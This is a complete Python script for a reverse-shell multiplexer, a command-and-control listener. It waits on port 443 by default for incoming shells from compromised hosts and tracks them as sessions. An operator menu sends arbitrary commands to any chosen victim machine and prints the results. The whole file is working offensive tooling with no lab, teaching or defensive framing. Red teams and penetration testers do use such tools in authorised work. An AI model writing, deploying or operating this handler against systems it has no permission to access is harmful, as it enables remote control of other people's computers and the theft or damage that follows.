import socket
import threading
import argparse

clients = {}  # session_id: (client_socket, address)
client_lock = threading.Lock()
session_counter = 0

def client_handler(client_socket, address, session_id):
    try:
        while True:
            # Keep-alive: wait for data or disconnection
            data = client_socket.recv(1)
            if not data:
                break
    except:
        pass
    finally:
        with client_lock:
            if session_id in clients:
                del clients[session_id]
        client_socket.close()
        print(f"\n[!] Session {session_id} from {address} disconnected")

def listener_thread(listen_ip, listen_port):
    global session_counter
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((listen_ip, listen_port))
    server.listen(5)
    print(f"[*] Listening for reverse shells on {listen_ip}:{listen_port}...\n")

    while True:
        client_socket, addr = server.accept()
        with client_lock:
            session_id = session_counter
            clients[session_id] = (client_socket, addr)
            session_counter += 1
        print(f"[+] New session {session_id} from {addr}")
        threading.Thread(target=client_handler, args=(client_socket, addr, session_id), daemon=True).start()

def interact(session_id):
    with client_lock:
        if session_id not in clients:
            print(f"[!] No session with ID {session_id}")
            return
        client_socket, addr = clients[session_id]

    print(f"[*] Interacting with session {session_id} ({addr}). Type 'exit' to return.")
    try:
        while True:
            cmd = input(f"Session {session_id}> ")
            if cmd.strip().lower() == "exit":
                print("[*] Returning to main menu...")
                break
            if cmd.strip() == "":
                continue
            client_socket.sendall((cmd + "\n").encode())
            response = client_socket.recv(4096)
            if not response:
                print(f"[!] Session {session_id} disconnected.")
                with client_lock:
                    del clients[session_id]
                break
            print(response.decode(errors="ignore"), end="")
    except Exception as e:
        print(f"[!] Error: {e}")

def main():
    parser = argparse.ArgumentParser(description="Reverse Shell Multiplexer")
    parser.add_argument("ip", nargs="?", default="0.0.0.0", help="IP to listen on (default: 0.0.0.0)")
    parser.add_argument("port", nargs="?", type=int, default=443, help="Port to listen on (default: 443)")
    args = parser.parse_args()

    threading.Thread(target=listener_thread, args=(args.ip, args.port), daemon=True).start()

    while True:
        try:
            cmd = input("Multiplexer> ").strip()
            if cmd == "sessions":
                with client_lock:
                    if not clients:
                        print("No active sessions.")
                    else:
                        for sid, (_, addr) in clients.items():
                            print(f"Session {sid}: {addr}")
            elif cmd.startswith("interact "):
                try:
                    sid = int(cmd.split()[1])
                    interact(sid)
                except (ValueError, IndexError):
                    print("Usage: interact <session_id>")
            elif cmd in ("exit", "quit"):
                print("Exiting...")
                break
            else:
                print("Commands:\n  sessions\n  interact <id>\n  exit")
        except KeyboardInterrupt:
            print("\n[!] Ctrl+C detected. Exiting...")
            break

if __name__ == "__main__":
    main()
                    
